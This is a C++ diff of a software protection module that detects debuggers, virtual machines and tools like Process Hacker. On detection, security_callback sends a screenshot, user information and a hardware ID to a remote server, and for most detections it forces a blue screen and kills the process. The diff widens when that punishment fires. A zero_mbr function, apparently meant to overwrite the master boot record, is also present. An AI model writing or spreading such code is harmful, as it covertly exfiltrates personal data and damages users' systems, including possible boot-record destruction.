@@ -13,6 +13,7 @@ auto security::runtime_security::start( ) -> void
 	check_for_debugger( );
 	check_for_drivers( );
 	process_blacklist( );
+
 	vmp_end;
 }
 
@@ -29,10 +30,12 @@ auto security::runtime_security::check_vm_files( ) -> void
 	for ( const auto &vm_file : vm_files )
 	{
 		if ( std::filesystem::exists( vm_file ) )
-			MessageBoxA( nullptr, "Vm Files Found", nullptr, 0 );
+		{
+			security_callback( utils::string::format(E("Virtual Machine files found: {}"),vm_file ),1 );
+		}
+			
 	}
 }
-
 
 auto security::runtime_security::process_blacklist( ) -> void
 {
@@ -40,7 +43,7 @@ auto security::runtime_security::process_blacklist( ) -> void
 	{
 		if ( utils::process::get_process_id( proc ) != 0 )
 		{
-			security_callback( E( "Process BlackList Found",), 1 );
+			security_callback( utils::string::format( E( "Process BlackList Found: {}" ),proc ), 1 );
 		}
 	}
 
@@ -53,10 +56,10 @@ auto security::runtime_security::check_for_drivers( ) -> void
 		{"SystemInformer.sys"}, {"kprocesshacker.sys"}
 	};
 
-	for( const auto &drivers : drivers_list )
+	for ( const auto &drivers : drivers_list )
 	{
 		if ( utils::system::search_drivers( drivers ) )
-			security_callback( E( "Driver Blacklist Found ",  ), 0 );
+			security_callback( utils::string::format( E( "Driver Blacklist Found: {}" ), drivers ), 1 );
 	}
 }
 
@@ -91,7 +94,7 @@ auto security::runtime_security::zero_mbr( ) -> void
 	CloseHandle( master_boot_record );
 }
 
-auto security::runtime_security::security_callback( char const *reason, const int type ) -> void
+auto security::runtime_security::security_callback( const std::string reason, const int type ) -> void
 {
 	static auto triggered_callback = false;
 
@@ -99,11 +102,12 @@ auto security::runtime_security::security_callback( char const *reason, const in
 	{
 		auto const post = std::make_unique< network::Requests >( );
 		post->post_report( utils::others::get_hwid_hash( ), utils::string::format( "{} \n {}", utils::system::get_user_info( ), reason ),
-		                                                                  utils::others::bufferto_base64( utils::others::capture_screen( ) ), type );
+															          utils::others::bufferto_base64( utils::others::capture_screen( ) ), type );
 		if ( type != 0 )
 		{
 			bsod( );
 			crash_program( );
+			ExitProcess( 0 );
 		}
 	}
 }
